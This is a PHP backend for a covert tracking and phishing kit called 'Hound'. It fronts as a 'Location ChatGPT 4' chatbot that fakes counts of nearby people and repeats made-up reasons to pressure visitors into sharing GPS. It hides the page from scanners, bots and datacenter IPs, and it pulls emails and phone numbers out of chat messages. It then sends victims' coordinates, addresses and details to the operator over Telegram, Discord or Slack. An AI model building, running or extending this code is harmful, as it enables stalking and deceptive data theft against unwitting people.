<?php
require_once __DIR__ . '/capture_helpers.php';

function hound_load_config() {
    static $config = null;
    if ($config !== null) {
        return $config;
    }
    $path = __DIR__ . '/config.json';
    if (!file_exists($path)) {
        return [];
    }
    $config = json_decode(file_get_contents($path), true);
    return is_array($config) ? $config : [];
}

function hound_data_dir() {
    $dir = __DIR__ . '/data';
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $dir;
}

function hound_read_json($filename, $default = []) {
    $path = hound_data_dir() . '/' . $filename;
    if (!file_exists($path)) {
        return $default;
    }
    $data = json_decode(file_get_contents($path), true);
    return is_array($data) ? $data : $default;
}

function hound_write_json($filename, $data) {
    file_put_contents(
        hound_data_dir() . '/' . $filename,
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
        LOCK_EX
    );
}

function hound_is_bot($userAgent) {
    $ua = strtolower($userAgent ?? '');
    if ($ua === '') {
        return true;
    }
    $patterns = [
        'bot', 'crawl', 'spider', 'slurp', 'curl', 'wget', 'python-requests',
        'headless', 'phantom', 'selenium', 'scrapy', 'facebookexternalhit',
        'preview', 'monitor', 'scanner', 'nikto', 'nmap', 'masscan', 'zgrab',
        'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduckbot'
    ];
    foreach ($patterns as $pattern) {
        if (strpos($ua, $pattern) !== false) {
            return true;
        }
    }
    if (preg_match('/\b(compatible;\s*\w+bot)/i', $userAgent ?? '')) {
        return true;
    }
    return false;
}

function hound_is_headless($userAgent, $headers = []) {
    $ua = strtolower($userAgent ?? '');
    return strpos($ua, 'headless') !== false
        || !empty($headers['Sec-Ch-Ua']) && strpos(strtolower($headers['Sec-Ch-Ua']), 'headless') !== false;
}

function hound_is_datacenter($enrichment) {
    if (!is_array($enrichment)) {
        return false;
    }
    return !empty($enrichment['hosting']) || !empty($enrichment['proxy']);
}

function hound_geofence_allowed($countryCode) {
    $config = hound_load_config();
    $security = $config['security'] ?? [];
    $allow = $security['geofence_countries'] ?? [];
    $block = $security['geofence_block_countries'] ?? [];

    if ($countryCode === null || $countryCode === '') {
        return empty($allow);
    }

    if (!empty($allow) && !in_array($countryCode, $allow, true)) {
        return false;
    }
    if (!empty($block) && in_array($countryCode, $block, true)) {
        return false;
    }
    return true;
}

function hound_schedule_allowed() {
    $config = hound_load_config();
    $security = $config['security'] ?? [];
    if (empty($security['schedule_enabled'])) {
        return true;
    }

    $timezone = $security['schedule_timezone'] ?? 'UTC';
    try {
        $now = new DateTime('now', new DateTimeZone($timezone));
    } catch (Exception $e) {
        $now = new DateTime('now', new DateTimeZone('UTC'));
    }

    $hour = (int) $now->format('G');
    $start = (int) ($security['schedule_start_hour'] ?? 9);
    $end = (int) ($security['schedule_end_hour'] ?? 17);

    if ($start <= $end) {
        return $hour >= $start && $hour < $end;
    }
    return $hour >= $start || $hour < $end;
}

function hound_generate_token($campaignId = 'default') {
    $token = bin2hex(random_bytes(16));
    $tokens = hound_read_json('tokens.json');
    $config = hound_load_config();
    $expiryMinutes = (int) (($config['security'] ?? [])['link_expiry_minutes'] ?? 120);

    $tokens[$token] = [
        'campaign_id' => $campaignId,
        'created_at' => date('c'),
        'expires_at' => date('c', time() + ($expiryMinutes * 60)),
        'used' => false,
        'uses' => 0
    ];
    hound_write_json('tokens.json', $tokens);
    return $token;
}

function hound_validate_token($token) {
    if (!$token) {
        return ['valid' => false, 'reason' => 'missing_token'];
    }

    $tokens = hound_read_json('tokens.json');
    if (!isset($tokens[$token])) {
        return ['valid' => false, 'reason' => 'invalid_token'];
    }

    $entry = $tokens[$token];
    if (!empty($entry['expires_at']) && strtotime($entry['expires_at']) < time()) {
        return ['valid' => false, 'reason' => 'expired_token'];
    }

    $config = hound_load_config();
    if (!empty(($config['security'] ?? [])['one_time_links']) && !empty($entry['used'])) {
        return ['valid' => false, 'reason' => 'token_already_used'];
    }

    $entry['used'] = true;
    $entry['uses'] = ($entry['uses'] ?? 0) + 1;
    $entry['last_used_at'] = date('c');
    $tokens[$token] = $entry;
    hound_write_json('tokens.json', $tokens);

    return ['valid' => true, 'campaign_id' => $entry['campaign_id'] ?? 'default'];
}

function hound_gate_check($token = null) {
    $config = hound_load_config();
    $security = $config['security'] ?? [];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = getClientIp();
    $enrichment = enrichIp($ip);
    $country = $enrichment['countryCode'] ?? null;

    $result = [
        'allowed' => true,
        'reason' => 'ok',
        'ip' => $ip,
        'country' => $country,
        'city' => $enrichment['city'] ?? null,
        'enrichment' => $enrichment,
        'campaign_id' => $_GET['id'] ?? (($config['campaigns'] ?? [])['default_campaign_id'] ?? 'default')
    ];

    if (!hound_schedule_allowed()) {
        return array_merge($result, ['allowed' => false, 'reason' => 'outside_schedule']);
    }

    if (!empty($security['one_time_links'])) {
        $token = $token ?: ($_GET['t'] ?? null);
        $tokenResult = hound_validate_token($token);
        if (!$tokenResult['valid']) {
            return array_merge($result, ['allowed' => false, 'reason' => $tokenResult['reason']]);
        }
        $result['campaign_id'] = $tokenResult['campaign_id'];
    }

    if (!hound_geofence_allowed($country)) {
        return array_merge($result, ['allowed' => false, 'reason' => 'geofence_blocked']);
    }

    if (!empty($security['block_bots']) && hound_is_bot($ua)) {
        return array_merge($result, ['allowed' => false, 'reason' => 'bot_detected']);
    }

    if (!empty($security['block_bots']) && hound_is_headless($ua, getServerHeaders())) {
        return array_merge($result, ['allowed' => false, 'reason' => 'headless_detected']);
    }

    if (!empty($security['block_datacenter_ips']) && hound_is_datacenter($enrichment)) {
        return array_merge($result, ['allowed' => false, 'reason' => 'datacenter_ip']);
    }

    return $result;
}

function hound_should_cloak($gateResult) {
    $config = hound_load_config();
    return !empty(($config['security'] ?? [])['cloaking_enabled']) && empty($gateResult['allowed']);
}

function hound_detect_device_type($userAgent) {
    $ua = strtolower($userAgent ?? '');
    if (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false) {
        return 'mobile';
    }
    if (strpos($ua, 'tablet') !== false || strpos($ua, 'ipad') !== false) {
        return 'tablet';
    }
    return 'desktop';
}

function hound_pick_locale($acceptLanguage, $preferred = null) {
    if ($preferred) {
        return strtolower(substr($preferred, 0, 2));
    }
    if (!$acceptLanguage) {
        return 'en';
    }
    $parts = explode(',', $acceptLanguage);
    $primary = trim(explode(';', $parts[0])[0]);
    return strtolower(substr($primary, 0, 2));
}

function hound_locale_pack($lang, $city = null, $onlineCount = null) {
    $city = $city ?: 'your area';
    $count = $onlineCount ?: random_int(3, 24);
    $packs = [
        'en' => [
            'title' => 'Location ChatGPT 4',
            'welcome' => "Hi! {$count} people near {$city} are online. Turn on location to find matches nearby.",
            'placeholder' => 'Ask me anything...',
            'send' => 'Send',
            'gps_retry_1' => "I can't show nearby people without your location. Please enable it in your browser.",
            'gps_retry_2' => 'Location is required to verify you are a real user and prevent spam.',
            'gps_retry_3' => 'Last step: enable location to unlock nearby profiles.',
            'return_visitor' => 'Welcome back! People near you are still online.'
        ],
        'es' => [
            'title' => 'Location ChatGPT 4',
            'welcome' => "¡Hola! {$count} personas cerca de {$city} están en línea. Activa tu ubicación.",
            'placeholder' => 'Pregúntame lo que quieras...',
            'send' => 'Enviar',
            'gps_retry_1' => 'Necesito tu ubicación para mostrar personas cercanas.',
            'gps_retry_2' => 'La ubicación es necesaria para verificar tu cuenta.',
            'gps_retry_3' => 'Último paso: activa la ubicación.',
            'return_visitor' => '¡Bienvenido de nuevo!'
        ],
        'de' => [
            'title' => 'Location ChatGPT 4',
            'welcome' => "Hallo! {$count} Personen in der Nähe von {$city} sind online. Standort aktivieren.",
            'placeholder' => 'Frag mich etwas...',
            'send' => 'Senden',
            'gps_retry_1' => 'Ohne Standort kann ich niemanden in der Nähe anzeigen.',
            'gps_retry_2' => 'Standort wird benötigt, um Spam zu verhindern.',
            'gps_retry_3' => 'Letzter Schritt: Standort freigeben.',
            'return_visitor' => 'Willkommen zurück!'
        ],
        'hi' => [
            'title' => 'Location ChatGPT 4',
            'welcome' => "नमस्ते! {$city} के पास {$count} लोग ऑनलाइन हैं। नजदीकी लोगों के लिए लोकेशन चालू करें।",
            'placeholder' => 'कुछ भी पूछें...',
            'send' => 'भेजें',
            'gps_retry_1' => 'पास के लोगों को दिखाने के लिए लोकेशन चाहिए।',
            'gps_retry_2' => 'स्पैम रोकने के लिए लोकेशन जरूरी है।',
            'gps_retry_3' => 'आखिरी कदम: लोकेशन चालू करें।',
            'return_visitor' => 'वापसी पर स्वागत है!'
        ],
        'fr' => [
            'title' => 'Location ChatGPT 4',
            'welcome' => "Bonjour ! {$count} personnes près de {$city} sont en ligne. Activez la localisation.",
            'placeholder' => 'Demandez-moi anything...',
            'send' => 'Envoyer',
            'gps_retry_1' => 'La localisation est nécessaire pour afficher les profils proches.',
            'gps_retry_2' => 'Activez la localisation pour vérifier votre compte.',
            'gps_retry_3' => 'Dernière étape : autoriser la localisation.',
            'return_visitor' => 'Bon retour !'
        ]
    ];
    return $packs[$lang] ?? $packs['en'];
}

function hound_extract_pii($text) {
    $found = ['emails' => [], 'phones' => [], 'usernames' => []];
    if (!$text) {
        return $found;
    }

    if (preg_match_all('/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $text, $matches)) {
        $found['emails'] = array_values(array_unique($matches[0]));
    }
    if (preg_match_all('/(?:\+?\d{1,3}[\s-]?)?(?:\(?\d{2,4}\)?[\s-]?)?\d{3,4}[\s-]?\d{3,4}/', $text, $matches)) {
        $found['phones'] = array_values(array_unique(array_filter($matches[0], function ($p) {
            return strlen(preg_replace('/\D/', '', $p)) >= 8;
        })));
    }
    if (preg_match_all('/(?:@|username[:\s]+)([a-zA-Z0-9_.]{3,30})/i', $text, $matches)) {
        $found['usernames'] = array_values(array_unique($matches[1]));
    }
    return $found;
}

function hound_haversine_km($lat1, $lon1, $lat2, $lon2) {
    $earth = 6371;
    $dLat = deg2rad($lat2 - $lat1);
    $dLon = deg2rad($lon2 - $lon1);
    $a = sin($dLat / 2) ** 2 + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon / 2) ** 2;
    return $earth * 2 * atan2(sqrt($a), sqrt(1 - $a));
}

function hound_ip_gps_mismatch($enrichment, $coords) {
    if (!is_array($enrichment) || !is_array($coords)) {
        return null;
    }
    if (!isset($enrichment['lat'], $enrichment['lon'], $coords['latitude'], $coords['longitude'])) {
        return null;
    }
    $distance = hound_haversine_km(
        (float) $enrichment['lat'],
        (float) $enrichment['lon'],
        (float) $coords['latitude'],
        (float) $coords['longitude']
    );
    return [
        'distance_km' => round($distance, 2),
        'likely_vpn' => $distance > 100,
        'ip_city' => $enrichment['city'] ?? null,
        'ip_country' => $enrichment['country'] ?? null
    ];
}

function hound_reverse_geocode($lat, $lon) {
    $url = 'https://nominatim.openstreetmap.org/reverse?format=json&lat=' . urlencode($lat) . '&lon=' . urlencode($lon);
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 4,
            'header' => "User-Agent: HoundOSINT/1.0\r\n"
        ]
    ]);
    $response = @file_get_contents($url, false, $ctx);
    if (!$response) {
        return null;
    }
    $data = json_decode($response, true);
    if (!$data) {
        return null;
    }
    return [
        'display_name' => $data['display_name'] ?? null,
        'address' => $data['address'] ?? null
    ];
}

function hound_compute_human_score($record) {
    $score = 35;
    $behavior = $record['behavior'] ?? [];
    $ua = strtolower($record['server']['user_agent'] ?? $record['user_agent'] ?? '');

    if (($behavior['mouse_moves'] ?? 0) > 8) $score += 15;
    if (($behavior['clicks'] ?? 0) > 0) $score += 10;
    if (($behavior['scrolls'] ?? 0) > 2) $score += 10;
    if (($behavior['keydowns'] ?? 0) > 2) $score += 10;
    if (($behavior['scroll_depth_max'] ?? 0) > 20) $score += 5;
    if (!empty($behavior['typing_intervals'])) $score += 10;
    if (strpos($ua, 'mobile') !== false) $score += 5;
    if (!empty($record['webdriver']) && $record['webdriver'] === true) $score -= 40;
    if (hound_is_bot($ua)) $score -= 50;

    return max(0, min(100, $score));
}

function hound_compute_risk_score($record) {
    $score = 0;
    $enrichment = $record['server']['ip_enrichment'] ?? [];
    if (!empty($enrichment['proxy'])) $score += 25;
    if (!empty($enrichment['hosting'])) $score += 30;
    if (!empty($record['ip_gps_mismatch']['likely_vpn'])) $score += 35;
    if (($record['human_score'] ?? 50) < 40) $score += 20;
    if (hound_is_bot($record['server']['user_agent'] ?? '')) $score += 50;
    return min(100, $score);
}

function hound_check_return_visitor($fingerprint) {
    if (!$fingerprint) {
        return null;
    }
    $visitors = hound_read_json('visitors.json');
    if (isset($visitors[$fingerprint])) {
        $visitors[$fingerprint]['visits'] = ($visitors[$fingerprint]['visits'] ?? 1) + 1;
        $visitors[$fingerprint]['last_seen'] = date('c');
        hound_write_json('visitors.json', $visitors);
        return $visitors[$fingerprint];
    }

    $visitors[$fingerprint] = [
        'first_seen' => date('c'),
        'last_seen' => date('c'),
        'visits' => 1
    ];
    hound_write_json('visitors.json', $visitors);
    return null;
}

function hound_update_session($record) {
    $sessionId = $record['session_id'] ?? null;
    if (!$sessionId) {
        return null;
    }

    $path = hound_data_dir() . '/sessions/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId) . '.json';
    if (!is_dir(dirname($path))) {
        mkdir(dirname($path), 0755, true);
    }

    $session = file_exists($path) ? json_decode(file_get_contents($path), true) : [];
    if (!is_array($session)) {
        $session = [];
    }

    $session['session_id'] = $sessionId;
    $session['updated_at'] = date('c');
    $session['events'] = $session['events'] ?? [];
    $session['events'][] = [
        'type' => $record['event_type'] ?? 'unknown',
        'at' => $record['received_at'] ?? date('c')
    ];

    foreach (['coordinates', 'chat', 'composite_fingerprint', 'human_score', 'risk_score', 'map_link', 'extracted_pii', 'return_visitor', 'address', 'campaign_id', 'link_variant'] as $field) {
        if (isset($record[$field])) {
            $session[$field] = $record[$field];
        }
    }

    if (!empty($record['server'])) {
        $session['server'] = $record['server'];
    }
    if (!empty($record['chat']) && ($record['event_type'] ?? '') === 'chat_message') {
        $session['chat_log'] = $session['chat_log'] ?? [];
        $session['chat_log'][] = $record['chat'];
    }

    $session['timeline'] = $session['timeline'] ?? [];
    $session['timeline'][] = $record;

    file_put_contents($path, json_encode($session, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
    return $session;
}

function hound_update_analytics($record) {
    $analytics = hound_read_json('analytics.json');
    $campaign = $record['link_variant'] ?? $record['campaign_id'] ?? 'default';
    $event = $record['event_type'] ?? 'unknown';

    if (!isset($analytics['campaigns'][$campaign])) {
        $analytics['campaigns'][$campaign] = [
            'opens' => 0,
            'locations' => 0,
            'chat_messages' => 0,
            'denied_gps' => 0,
            'return_visitors' => 0,
            'events' => []
        ];
    }

    $analytics['campaigns'][$campaign]['events'][$event] = ($analytics['campaigns'][$campaign]['events'][$event] ?? 0) + 1;

    if ($event === 'link_open' || $event === 'fingerprint') {
        $analytics['campaigns'][$campaign]['opens']++;
    }
    if ($event === 'location') {
        $analytics['campaigns'][$campaign]['locations']++;
    }
    if ($event === 'chat_message') {
        $analytics['campaigns'][$campaign]['chat_messages']++;
    }
    if ($event === 'location_error') {
        $analytics['campaigns'][$campaign]['denied_gps']++;
    }
    if (!empty($record['return_visitor'])) {
        $analytics['campaigns'][$campaign]['return_visitors']++;
    }

    $analytics['updated_at'] = date('c');
    hound_write_json('analytics.json', $analytics);
}

function hound_send_alert($eventType, $record) {
    $config = hound_load_config();
    $alerts = $config['alerts'] ?? [];
    $enabledEvents = $alerts['on_events'] ?? [];
    if (!in_array($eventType, $enabledEvents, true)) {
        if ($eventType === 'fingerprint' && in_array('link_open', $enabledEvents, true)) {
            // allow
        } elseif ($eventType === 'return_visit_beacon' && in_array('return_visitor', $enabledEvents, true)) {
            // allow
        } elseif ($eventType !== 'high_value' && $eventType !== 'return_visitor') {
            return;
        }
    }

    $risk = $record['risk_score'] ?? 0;
    if ($eventType === 'high_value' && $risk < 40 && empty($record['coordinates'])) {
        return;
    }

    $title = '[Hound] ' . strtoupper($eventType);
    $lines = [
        'Session: ' . ($record['session_id'] ?? 'n/a'),
        'IP: ' . ($record['server']['server_ip'] ?? 'n/a'),
        'City: ' . ($record['server']['ip_enrichment']['city'] ?? 'n/a'),
        'Human: ' . ($record['human_score'] ?? 'n/a'),
        'Risk: ' . ($record['risk_score'] ?? 'n/a')
    ];
    if (!empty($record['map_link'])) {
        $lines[] = 'Map: ' . $record['map_link'];
    }
    if (!empty($record['chat']['text'])) {
        $lines[] = 'Chat: ' . $record['chat']['text'];
    }
    if (!empty($record['extracted_pii']['emails'])) {
        $lines[] = 'Emails: ' . implode(', ', $record['extracted_pii']['emails']);
    }
    $message = $title . "\n" . implode("\n", $lines);

    if (!empty($alerts['telegram_bot_token']) && !empty($alerts['telegram_chat_id'])) {
        $url = 'https://api.telegram.org/bot' . $alerts['telegram_bot_token'] . '/sendMessage';
        $payload = http_build_query([
            'chat_id' => $alerts['telegram_chat_id'],
            'text' => $message
        ]);
        @file_get_contents($url . '?' . $payload);
    }

    if (!empty($alerts['discord_webhook_url'])) {
        hound_post_json($alerts['discord_webhook_url'], ['content' => $message]);
    }

    if (!empty($alerts['slack_webhook_url'])) {
        hound_post_json($alerts['slack_webhook_url'], ['text' => $message]);
    }
}

function hound_post_json($url, $payload) {
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => json_encode($payload),
            'timeout' => 4
        ]
    ]);
    @file_get_contents($url, false, $ctx);
}

function hound_llm_chat($message, $context) {
    $config = hound_load_config();
    $llm = $config['llm'] ?? [];
    if (empty($llm['enabled']) || empty($llm['api_key'])) {
        return null;
    }

    $system = $llm['system_prompt'] ?? 'You are a helpful assistant.';
    if (!empty($context['city'])) {
        $system .= ' The user appears to be near ' . $context['city'] . '.';
    }
    if (!empty($context['location_denied'])) {
        $system .= ' The user denied location; politely explain why location helps find nearby people.';
    }

    $body = [
        'model' => $llm['model'] ?? 'gpt-4o-mini',
        'messages' => [
            ['role' => 'system', 'content' => $system],
            ['role' => 'user', 'content' => $message]
        ],
        'max_tokens' => 120,
        'temperature' => 0.7
    ];

    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\nAuthorization: Bearer " . $llm['api_key'] . "\r\n",
            'content' => json_encode($body),
            'timeout' => 15
        ]
    ]);

    $response = @file_get_contents($llm['api_url'] ?? 'https://api.openai.com/v1/chat/completions', false, $ctx);
    if (!$response) {
        return null;
    }
    $data = json_decode($response, true);
    return $data['choices'][0]['message']['content'] ?? null;
}

function hound_rule_based_chat($message, $context) {
    $lang = $context['locale'] ?? 'en';
    $pack = hound_locale_pack($lang, $context['city'] ?? null);
    $text = strtolower($message);

    if (!empty($context['location_denied'])) {
        $retry = (int) ($context['gps_retry_count'] ?? 1);
        return $pack['gps_retry_' . min($retry, 3)] ?? $pack['gps_retry_1'];
    }

    if (strpos($text, 'where') !== false || strpos($text, 'near') !== false || strpos($text, 'location') !== false) {
        return str_replace('{$city}', $context['city'] ?? 'your area', "People near " . ($context['city'] ?? 'you') . " are active now. Enable location and I'll show matches.");
    }
    if (strpos($text, 'hi') !== false || strpos($text, 'hello') !== false) {
        return $pack['welcome'];
    }
    if (strpos($text, 'name') !== false) {
        return 'I am ' . (($context['bot_name'] ?? 'Admin')) . ', your local guide. Enable location to continue.';
    }

    $fallbacks = [
        'Tell me more about who is nearby.',
        'Enable location and I can show active people close to you.',
        'I can help once location access is turned on.'
    ];
    return $fallbacks[array_rand($fallbacks)];
}

function hound_chat_response($message, $context) {
    $llm = hound_llm_chat($message, $context);
    if ($llm) {
        return trim($llm);
    }
    return hound_rule_based_chat($message, $context);
}

function hound_process_record($record) {
    $chatText = $record['chat']['text'] ?? null;
    if ($chatText) {
        $record['extracted_pii'] = hound_extract_pii($chatText);
    }

    if (!empty($record['composite_fingerprint'])) {
        $record['return_visitor'] = hound_check_return_visitor($record['composite_fingerprint']);
    }

    $enrichment = $record['server']['ip_enrichment'] ?? null;
    $coords = $record['coordinates'] ?? null;
    if ($enrichment && $coords) {
        $record['ip_gps_mismatch'] = hound_ip_gps_mismatch($enrichment, $coords);
    }

    if ($coords && isset($coords['latitude'], $coords['longitude'])) {
        $record['address'] = hound_reverse_geocode($coords['latitude'], $coords['longitude']);
    }

    $record['human_score'] = hound_compute_human_score($record);
    $record['risk_score'] = hound_compute_risk_score($record);

    hound_update_session($record);
    hound_update_analytics($record);

    $event = $record['event_type'] ?? 'unknown';
    hound_send_alert($event, $record);

    if (!empty($record['return_visitor'])) {
        hound_send_alert('return_visitor', $record);
    }
    if (($record['human_score'] ?? 0) >= 70 && !empty($record['coordinates'])) {
        hound_send_alert('high_value', $record);
    }
    if (!empty($record['extracted_pii']['emails']) || !empty($record['extracted_pii']['phones'])) {
        hound_send_alert('high_value', $record);
    }

    return $record;
}

function hound_save_event($record) {
    $record = hound_process_record($record);
    file_put_contents(
        __DIR__ . '/data.txt',
        json_encode($record, JSON_UNESCAPED_SLASHES) . "\n",
        FILE_APPEND | LOCK_EX
    );
    return $record;
}

function hound_list_sessions() {
    $dir = hound_data_dir() . '/sessions';
    if (!is_dir($dir)) {
        return [];
    }
    $sessions = [];
    foreach (glob($dir . '/*.json') as $file) {
        $data = json_decode(file_get_contents($file), true);
        if ($data) {
            $sessions[] = $data;
        }
    }
    usort($sessions, function ($a, $b) {
        return strcmp($b['updated_at'] ?? '', $a['updated_at'] ?? '');
    });
    return $sessions;
}

function hound_client_context() {
    $config = hound_load_config();
    $branding = $config['branding'] ?? [];
    $engagement = $config['engagement'] ?? [];
    $ip = getClientIp();
    $enrichment = enrichIp($ip);
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $lang = hound_pick_locale($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', null);
    $city = $enrichment['city'] ?? 'your area';
    $locale = hound_locale_pack($lang, $city);

    return [
        'branding' => array_merge($branding, [
            'title' => $locale['title'] ?? $branding['title'],
            'welcome_message' => $locale['welcome'] ?? $branding['welcome_message'],
            'input_placeholder' => $locale['placeholder'] ?? $branding['input_placeholder'],
            'send_button' => $locale['send'] ?? $branding['send_button']
        ]),
        'locale' => $lang,
        'locale_strings' => $locale,
        'city' => $city,
        'country' => $enrichment['country'] ?? null,
        'device_type' => hound_detect_device_type($ua),
        'online_count' => random_int(3, 24),
        'engagement' => $engagement,
        'campaign_id' => $_GET['id'] ?? (($config['campaigns'] ?? [])['default_campaign_id'] ?? 'default'),
        'pwa_enabled' => !empty($engagement['pwa_enabled']),
        'progressive_gps_delay_ms' => (int) ($engagement['progressive_gps_delay_ms'] ?? 8000),
        'gps_retry_max' => (int) ($engagement['gps_retry_max'] ?? 3)
    ];
}
